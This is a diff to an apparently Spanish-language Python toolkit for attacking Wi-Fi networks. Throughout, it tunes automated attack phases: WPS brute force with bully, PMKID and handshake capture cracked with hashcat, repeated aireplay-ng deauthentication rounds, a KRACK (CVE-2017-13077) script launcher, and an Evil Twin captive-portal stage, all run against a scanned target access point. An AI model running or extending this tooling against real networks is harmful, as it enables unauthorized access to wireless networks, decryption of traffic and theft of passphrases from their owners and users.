@@ -471,6 +471,12 @@ def verify_handshake(cap_file):
     r = run(f"aircrack-ng {cap_file} 2>&1", capture=True)
     if r and "handshake" in r.lower():
         return True, cap_file
+    # Verificación alternativa con hcxpcapngtool si aircrack-ng no detecta handshake
+    if os.path.exists(cap_file) and check_tool("hcxpcapngtool"):
+        _hc_test = run(f"hcxpcapngtool -o /tmp/_hs_test.hc22000 {cap_file} 2>&1", capture=True) or ""
+        if os.path.exists("/tmp/_hs_test.hc22000") and os.path.getsize("/tmp/_hs_test.hc22000") > 0:
+            run("rm -f /tmp/_hs_test.hc22000")
+            return True, cap_file
     return False, cap_file
 
 # ─────────────────────────────────────────────────────────────────────────────
@@ -1617,6 +1623,14 @@ def pmkid_attack():
     sp.stop()
 
     if os.path.exists(hc_file) and os.path.getsize(hc_file) > 0:
+        # Verificar que contiene al menos un hash PMKID válido (líneas no vacías)
+        with open(hc_file, "r", errors="ignore") as _hf:
+            _lines = [l.strip() for l in _hf if l.strip()]
+        if not _lines:
+            warn("El archivo .hc22000 está vacío o sin hashes válidos.")
+            warn("El AP puede no enviar PMKID. Intenta capturar handshake con [7].")
+            pause_back(); return
+        info(f"{len(_lines)} hash(es) PMKID capturado(s).")
         ok(f"Hash listo: {hc_file}")
         crack = ask("¿Iniciar crackeo ahora? (s/n)")
         if crack.lower() == 's':
@@ -1698,7 +1712,7 @@ def wps_attack():
             pause_back()
             return
         warn("Este ataque puede tardar HORAS.")
-        run(f"bully {interfaz} -b {bssid} -c {channel} -e {essid} --force")
+        run(f"bully {interfaz} -b {bssid} -c {channel} -e {essid} --timeout 10 -S --force")
     else:
         error("Opción inválida.")
 
@@ -2435,6 +2449,9 @@ def auto_crack():
     if not diccionario:
         pause_back()
         return
+    if diccionario and not os.path.exists(diccionario):
+        error(f"Diccionario no encontrado: {diccionario}")
+        pause_back(); return
 
     step(1, f"Capturando handshake de '{essid}'")
     tip("Se enviará deauth para forzar la reconexión del cliente.")
@@ -2470,6 +2487,8 @@ def auto_crack():
         sp2.stop()
 
     step(3, "Iniciando crackeo")
+    if not os.path.exists(hc_file) or os.path.getsize(hc_file) == 0:
+        warn("Conversión a hc22000 falló. Intentando crackear directamente con aircrack-ng...")
     if os.path.exists(hc_file) and os.path.getsize(hc_file) > 0 and check_tool("hashcat"):
         info(f"Usando {GREEN}hashcat (GPU){END}")
         best64 = next((p for p in [
@@ -4440,19 +4459,42 @@ def modern_vulns():
   {DIM}• Fuerza reutilización de nonce en la clave de sesión
   • Permite descifrar/inyectar tráfico WPA2
   • Más efectivo contra clientes Android/Linux sin parche
-  • CVE-2017-13077 a CVE-2017-13088{END}
+  • CVE-2017-13077 a CVE-2017-13088
+  • Requiere madwifi/mac80211 parcheado y adaptador con inyección{END}
         """)
-        if not check_tool("krackattacks"):
-            warn("krackattacks no instalado.")
-            info("Instale: git clone https://github.com/vanhoefm/krackattacks-scripts")
-            tip("Requiere: hostapd parcheado + adaptador con inyección")
-            tip("Distros modernas (2018+) están parcheadas. Más efectivo en IoT.")
+        # Buscar herramienta KRACK en PATH y en /opt
+        _krack_script = None
+        for _kpath in ["/opt/krackattacks-poc-zerokey/krack-test-client.py",
+                       "/opt/krackattacks-scripts/krack-test-client.py",
+                       "/opt/krackattacks/krack-test-client.py"]:
+            if os.path.exists(_kpath):
+                _krack_script = _kpath
+                break
+        if not _krack_script:
+            _kr_which = run("which krack-test-client.py 2>/dev/null", capture=True) or ""
+            if _kr_which.strip():
+                _krack_script = _kr_which.strip()
+        if not _krack_script and check_tool("krackattacks"):
+            _krack_script = "krackattacks"
+
+        if not _krack_script:
+            warn("krackattacks-poc-zerokey no encontrado en PATH ni en /opt.")
+            info("Instale con:")
+            tip("  git clone https://github.com/vanhoefm/krackattacks-poc-zerokey /opt/krackattacks-poc-zerokey")
+            tip("  cd /opt/krackattacks-poc-zerokey && pip3 install -r requirements.txt")
+            tip("Requiere: hostapd parcheado + adaptador con inyección (mac80211)")
+            tip("Distros modernas (2018+) están parcheadas. Más efectivo en IoT/AP sin actualizar.")
         else:
             interfaz = select_interface()
             bssid, channel, essid = select_target_from_scan(interfaz)
             if bssid:
-                run(f"krack-test-client.py --interface {interfaz} --bssid {bssid}")
-                db_log_attack("KRACK", essid, bssid, channel, "ejecutado")
+                info(f"Ejecutando KRACK contra {essid} ({bssid})...")
+                tip("El ataque prueba reinstalación de claves en el 4-way handshake.")
+                if _krack_script.endswith(".py"):
+                    run(f"python3 {_krack_script} --interface {interfaz} --bssid {bssid}")
+                else:
+                    run(f"{_krack_script} --interface {interfaz} --bssid {bssid}")
+                db_log_attack("KRACK CVE-2017-13077", essid, bssid, channel, "ejecutado")
 
     # ── [5] SSID Confusion (CVE-2023-52424) ──────────────────────────────────
     elif op == "5":
@@ -5726,17 +5768,17 @@ def smart_exploit_target(eng: ExploitEngine) -> tuple:
     wordlist = eng.wordlist
     essid_s  = re.sub(r'[^\w\-]', '_', essid)
 
-    # Fases con pesos
-    eng.add_phase("Fingerprint & CVE detect",  7)
-    eng.add_phase("WPS Pixie Dust",            10)
-    eng.add_phase("WPS Smart PIN",             7)
+    # Fases con pesos calibrados
+    eng.add_phase("Fingerprint & CVE detect",  5)
+    eng.add_phase("WPS Pixie Dust",            15)
+    eng.add_phase("WPS Smart PIN",             18)
     eng.add_phase("PMKID capture + hashcat",   15)
-    eng.add_phase("Handshake capture + deauth",13)
-    eng.add_phase("Multi-rule cracking",       13)
-    eng.add_phase("Ataque de mascaras",        10)
-    eng.add_phase("WPS Brute Force",           7)
-    eng.add_phase("PMKID retry extendido",     5)
-    eng.add_phase("Evil Twin + portal cautivo",13)
+    eng.add_phase("Handshake capture + deauth",12)
+    eng.add_phase("Crack multi-reglas",        13)
+    eng.add_phase("Mask attack",               10)
+    eng.add_phase("WPS Brute Force",            7)
+    eng.add_phase("PMKID retry",                5)
+    eng.add_phase("Evil Twin",                  5)
 
     eng.start()
 
@@ -5841,9 +5883,9 @@ def smart_exploit_target(eng: ExploitEngine) -> tuple:
                 shell=True,
                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
             )
-            # Progreso durante captura (45s — más tiempo = más probabilidad de PMKID)
-            for tick in range(45):
-                eng.update_phase(5 + int(tick / 45 * 45))
+            # Progreso durante captura (90s — más tiempo = más probabilidad de PMKID)
+            for tick in range(90):
+                eng.update_phase(5 + int(tick / 90 * 45))
                 time.sleep(1)
             capture_proc.terminate(); capture_proc.wait()
             eng.update_phase(55)
@@ -5901,12 +5943,12 @@ def smart_exploit_target(eng: ExploitEngine) -> tuple:
         eng.update_phase(10)
         time.sleep(6)  # dar tiempo al airodump para sincronizar
 
-        # 3 rondas de deauth suaves (5 → 10 → 15 paquetes) con pausa larga entre rondas
-        for round_n, deauth_count in enumerate([5, 10, 15], 1):
-            eng.update_phase(10 + round_n * 20)
-            run(f"aireplay-ng -0 {deauth_count} -a {bssid} {iface} 2>/dev/null",
+        # 5 rondas de deauth (3 paquetes cada ronda) con pausa entre rondas
+        for round_n in range(5):
+            eng.update_phase(10 + round_n * 15)
+            run(f"aireplay-ng -0 3 -a {bssid} {iface} 2>/dev/null",
                 capture=True)
-            time.sleep(8)  # pausa larga para que el cliente se reconecte
+            time.sleep(2)  # pausa para que el cliente se reconecte
             # Verificar si ya hay handshake
             cap_list = [f for f in os.listdir("exploit-engine")
                         if f.startswith(f"hs_{essid_s}") and f.endswith(".cap")]
